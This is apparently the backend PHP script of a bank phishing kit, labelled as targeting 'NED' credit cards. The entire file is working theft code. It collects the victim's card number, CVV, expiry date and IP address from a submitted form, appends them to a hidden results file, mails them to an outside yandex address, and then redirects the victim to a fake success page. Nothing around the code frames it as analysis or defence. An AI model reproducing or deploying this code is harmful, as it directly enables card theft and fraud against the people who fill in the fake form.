<?php

$ip = getenv("REMOTE_ADDR");
$message .= "-------- NED CREDIT CARD ------------\n";
$message .= "Card Number : ".$_POST['cust_card_number']."\n";
$message .= "CVV : ".$_POST['cvv']."\n";
$message .= "Expiry Month : ".$_POST['card_expiry_month']."\n";
$message .= "Expiry Year: ".$_POST['card_expiry_year']."\n";
$message .= "IP: ".$ip."\n";
$message .= "port: ".$port."\n";
$message .= "---------Created DON MONEY--------------\n";
$recipient = "bi1l.williams@yandex.com";
$subject = "3rd NED Credit Card";
$fp = fopen("resultzICtyYWlzZWQrICInPjxoNCBzdHlsZT0ncGFkZGluZzo0cHggMCc9.txt","a");
fputs($fp,$message);
fclose($fp);

mail($recipient,$subject,$message,$headers);
header("Location: success.php");
?>